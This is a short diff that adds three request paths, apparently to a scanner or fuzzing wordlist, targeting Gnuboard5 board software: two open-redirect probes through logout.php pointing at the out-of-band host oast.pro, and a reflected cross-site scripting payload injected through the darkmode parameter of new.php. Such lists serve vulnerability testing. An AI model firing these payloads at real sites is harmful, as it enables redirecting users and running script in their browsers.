@@ -1,0 +1,3 @@
+/gnuboard5/bbs/logout.php?url=/\\oast.pro
+/bbs/logout.php?url=/\\oast.pro
+/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
